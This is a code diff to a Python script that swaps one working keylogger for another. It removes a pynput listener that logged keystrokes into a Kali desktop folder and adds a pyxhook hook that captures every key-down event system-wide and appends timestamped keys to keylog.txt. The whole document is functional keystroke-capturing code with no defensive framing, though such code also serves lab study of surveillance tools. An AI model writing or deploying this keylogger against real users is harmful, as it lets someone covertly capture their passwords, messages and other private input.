@@ -1,20 +1,38 @@
-# pynputkey.py
-import pynput
-from pynput.keyboard import Key, Listener
-import logging
-import os
+import pyxhook
+import time
+import sys
+import signal
 
-log_dir = "/home/kali/Desktop/log"
-log_file = "keylog.txt"
+# Create a hook manager
+hookman = pyxhook.HookManager()
 
-# Create the log directory if it doesn't exist
-if not os.path.exists(log_dir):
-    os.makedirs(log_dir)
+# Define a function to handle keyboard events
+def on_key_press(event):
+    # Get the current timestamp
+    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
 
-logging.basicConfig(filename=os.path.join(log_dir, log_file), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+    # Create a log file if it doesn't exist
+    log_file = "keylog.txt"
+    with open(log_file, "a") as f:
+        # Write the key press event to the log file
+        f.write(f"{timestamp} - Key pressed: {event.Key}\n")
 
-def on_press(key):
-    logging.info(str(key))
+# Define a function to handle keyboard interrupts
+def signal_handler(sig, frame):
+    print("\nLove you 3000, Shady!")
+    hookman.cancel()
+    sys.exit(0)
 
-with Listener(on_press=on_press) as listener:
-    listener.join()
+# Set the hook
+hookman.HookKeyboard()
+hookman.KeyDown = on_key_press
+
+# Set the signal handler
+signal.signal(signal.SIGINT, signal_handler)
+
+# Start the hook
+hookman.start()
+
+# Wait for the hook to be cancelled
+while hookman.is_running():
+    time.sleep(1)
